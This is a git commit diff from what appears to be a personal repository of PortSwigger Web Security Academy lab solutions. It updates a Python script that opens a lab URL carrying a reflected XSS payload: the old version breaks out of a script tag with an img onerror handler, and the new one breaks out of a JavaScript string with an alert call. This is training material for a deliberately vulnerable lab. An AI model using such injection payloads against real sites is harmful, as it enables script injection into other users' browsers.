e9611a4c8916c76546bd11d23584432778568652
jacopoaugelli <jacopo.augelli777@gmail.com>
2023-08-25 20:13:12 +0200

    Labs solved

--- PortSwigger/Cross-Site Scripting/16_XSS.py
+++ PortSwigger/Cross-Site Scripting/16_XSS.py
@@ -3,11 +3,11 @@ import argparse
 import webbrowser as wb
 from time import sleep
 
-parser = argparse.ArgumentParser(description='Solves the following Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped')
+parser = argparse.ArgumentParser(description='Solves the following Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded')
 parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
 lab = parser.parse_args()
 
-wb.open("https://" + lab.id + '.web-security-academy.net/?search=%3C/script%3E%3Cimg%20src=xss%20onerror=alert(%22XSS%22)%3E')
+wb.open("https://" + lab.id + '.web-security-academy.net/?search=\';alert(%22XSS%22);//')
 
 sleep(5)
 
